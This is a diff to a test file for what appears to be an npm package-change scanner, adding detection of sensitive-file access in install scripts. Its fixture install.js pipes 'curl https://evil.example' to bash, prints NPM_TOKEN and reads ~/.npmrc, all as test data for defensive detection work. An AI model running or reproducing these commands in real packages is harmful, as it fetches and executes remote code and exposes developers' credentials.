@@ -80,7 +80,8 @@ describe("analyseManifestChange", () => {
         },
         {
           path: "package/install.js",
-          content: "const cp = require('child_process'); cp.execSync('curl https://evil.example | bash'); console.log(process.env.NPM_TOKEN)"
+          content:
+            "const cp = require('child_process'); const fs = require('fs'); const os = require('os'); cp.execSync('curl https://evil.example | bash'); console.log(process.env.NPM_TOKEN); fs.readFileSync(os.homedir() + '/.npmrc')"
         },
         {
           path: "package/.env",
@@ -101,9 +102,11 @@ describe("analyseManifestChange", () => {
     expect(codes).toContain("USES_CHILD_PROCESS");
     expect(codes).toContain("NETWORK_ACCESS_IN_INSTALL_PATH");
     expect(codes).toContain("USES_PROCESS_ENV");
+    expect(codes).toContain("SENSITIVE_FILE_ACCESS_IN_INSTALL_PATH");
     expect(codes).toContain("UNEXPECTED_BINARY_FILE");
     expect(result.fileFindings.map((finding) => finding.path)).toContain(".env");
     expect(result.fileFindings).toContainEqual(expect.objectContaining({ path: "install.js", evidence: expect.objectContaining({ installPath: true, pattern: "child_process" }) }));
+    expect(result.fileFindings).toContainEqual(expect.objectContaining({ path: "install.js", evidence: expect.objectContaining({ installPath: true, pattern: "sensitive-file-access" }) }));
   });
 
   it("flags unsafe tar paths, symlinks, and large size deltas while scoping code checks to install paths", () => {
